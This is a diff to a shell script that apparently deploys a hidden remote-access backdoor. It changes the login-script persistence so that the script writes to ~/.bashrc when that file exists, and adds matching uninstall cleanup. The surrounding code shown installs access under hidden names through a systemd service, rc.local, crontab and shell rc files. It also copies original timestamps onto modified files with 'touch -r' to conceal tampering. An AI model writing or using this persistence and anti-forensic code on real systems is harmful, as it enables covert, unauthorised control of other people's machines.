@@ -164,7 +164,13 @@ init_vars()
 	RCLOCAL_DIR="${GS_PREFIX}/etc"
 	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
 
-	RC_FILE="${GS_PREFIX}${HOME}/.profile"
+	RC_FILENAME=".profile"
+	RC_FILENAME_STATUS=".profile"
+	if [[ -f ~/.bashrc ]]; then
+		RC_FILENAME=".bashrc"
+		RC_FILENAME_STATUS=".bashrc." # for status output ~/.bashrc.....[OK]
+	fi
+	RC_FILE="${GS_PREFIX}${HOME}/${RC_FILENAME}"
 
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
@@ -180,9 +186,9 @@ init_setup()
 		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
 		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
-		if [[ -f "${HOME}/.profile" ]]; then
-			cp "${HOME}/.profile" "${GS_PREFIX}${HOME}/.profile"
-			touch -r "${HOME}/.profile" "${GS_PREFIX}${HOME}/.profile"
+		if [[ -f "${HOME}/${RC_FILENAME}" ]]; then
+			cp "${HOME}/${RC_FILENAME}" "${RC_FILE}"
+			touch -r "${HOME}/${RC_FILENAME}" "${RC_FILE}"
 		fi
 		cp /etc/rc.local "${GS_PREFIX}/etc/"
 		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
@@ -277,6 +283,7 @@ uninstall()
 	uninstall_rmdir "${TMPDIR}"
 
 	# Remove from login script
+	uninstall_rc "${GS_PREFIX}${HOME}/.bashrc"
 	uninstall_rc "${GS_PREFIX}${HOME}/.profile"
 	uninstall_rc "${GS_PREFIX}/etc/rc.local"
 
@@ -458,7 +465,7 @@ install_user_crontab()
 
 install_user_profile()
 {
-	echo -en 2>&1 "Installing access via ~/.profile......................................"
+	echo -en 2>&1 "Installing access via ~/${RC_FILENAME_STATUS}......................................"
 	[[ -z "$KL_CMD" ]] && { FAIL_OUT "No pkill or killall found."; return; }
 	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
 	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
